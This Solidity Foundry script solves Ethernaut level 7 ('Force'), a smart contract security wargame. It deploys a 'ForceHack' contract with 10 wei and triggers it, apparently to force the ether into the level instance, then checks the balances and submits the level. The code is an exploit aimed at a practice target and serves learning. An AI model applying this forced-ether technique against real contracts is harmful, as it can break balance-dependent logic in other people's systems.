// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {console} from "lib/forge-std/src/Script.sol";
import {EthernautScript} from "./Ethernaut.s.sol";
import {ForceHack} from "../src/7_Force/ForceHack.sol";

interface Instance {}

contract LevelScript is EthernautScript {
    address level = 0x46f79002907a025599f355A04A512A6Fd45E671B;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.startBroadcast(key);
        vm.deal(player, 100 ether);
        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function hack() internal {
        ForceHack forceHack = new ForceHack{value: 10}(
            payable(address(instance))
        );
        forceHack.SolidityBuild();
        require(
            address(forceHack).balance == 0,
            "address(forceHack).balance != 0"
        );
        require(
            address(instance).balance == 10,
            "address(instance).balance != 10"
        );
    }

    function run() public {
        hack();
        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
// forge script ./script/7_Force.s.sol
